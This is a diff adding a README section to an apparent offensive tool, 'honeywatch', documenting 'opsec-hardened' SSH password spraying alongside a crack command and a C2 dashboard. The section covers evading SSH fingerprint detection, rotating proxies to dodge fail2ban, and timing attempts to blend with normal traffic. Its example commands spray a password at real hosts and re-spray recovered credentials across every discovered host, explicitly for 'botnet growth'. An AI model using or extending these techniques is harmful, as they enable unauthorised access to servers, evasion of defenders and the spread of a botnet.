@@ -505,6 +505,32 @@ concurrency per host (default 8) and per fleet (default 32), stops a host on
 the first hit by default, and never raises — every outcome lands in a
 `CrackResult`. See `honeywatch crack --help` and [docs/crack.md](docs/crack.md).
 
+### Opsec-hardened spraying
+
+`honeywatch spray` is the lockout-safe growth primitive — one password across
+many users, then wait out the lockout window, then the next password (the
+TREVORspray / CredMaster pattern). It sits on a real opsec layer grounded in
+public defensive research (see [docs/opsec.md](docs/opsec.md)):
+
+- **HASSH/JA4SSH evasion** — prefers the real `ssh`+`sshpass` backend so the
+  target sees a genuine OpenSSH KEXINIT fingerprint, not paramiko's.
+- **Source rotation** — `--proxy-file` / `--jump-file` round-robin the egress IP
+  per attempt so per-IP fail2ban thresholds never trip.
+- **Timing** — `--delay` / `--jitter` / `--lockout-delay` and `--business-hours`
+  so attempts blend with organic login traffic instead of an off-hours spike.
+- **Auth-method precheck** — skips publickey-only hosts (zero wasted noise).
+
+```bash
+# Lockout-safe spray, business hours, rotating a SOCKS pool
+honeywatch spray --target-label real --min-confidence 0.8 \
+  --passwords 'Summer2024!' --delay 2 --jitter 1 --business-hours \
+  --proxy-file proxies.txt --skip-vpn-check
+
+# Fleet growth: re-spray every recovered password across every host you've
+# ever discovered (password reuse = botnet growth)
+honeywatch spray --reuse-creds --skip-vpn-check
+```
+
 ### C2 controller / dashboard
 
 Start the control plane:
